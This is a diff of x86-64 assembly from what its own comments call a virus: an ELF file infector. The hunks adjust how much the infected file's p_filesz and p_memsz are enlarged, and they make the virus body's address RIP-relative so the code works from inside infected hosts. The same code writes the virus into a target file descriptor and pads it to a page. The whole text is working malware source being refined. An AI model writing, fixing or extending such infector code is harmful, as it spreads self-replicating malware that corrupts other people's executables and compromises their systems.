@@ -114,7 +114,7 @@ _else_if:
 	mov r10, QWORD [rsp + 32]
 	add r10, 32 ; p_filesz offset
 	mov r11, QWORD [rsp + 16]
-	add r11, 8 ; don't forget the 8 first bytes off the entry point, didnt count in virus size
+	add r11, 32 ; don't forget the 8 first bytes off the entry point, didnt count in virus size
 	add QWORD [r10], r11
 	add r10, 8 ; p_memsz offset is 8 bytes further p_filesz
 	add QWORD [r10], r11
@@ -190,7 +190,7 @@ _write_in_fd:
 ; write(fd, virus, virus_size);
 	mov rax, 1
 	mov rdi, QWORD [rsp + 24] ; fd
-	mov rsi, _string ; buff
+	lea rsi, [rel _string] ; buff
 	mov rdx, QWORD [rsp + 16] ; size
 	syscall
 ; for i < 4096 - (virus_size + 8) write(fd, &(0), 1);
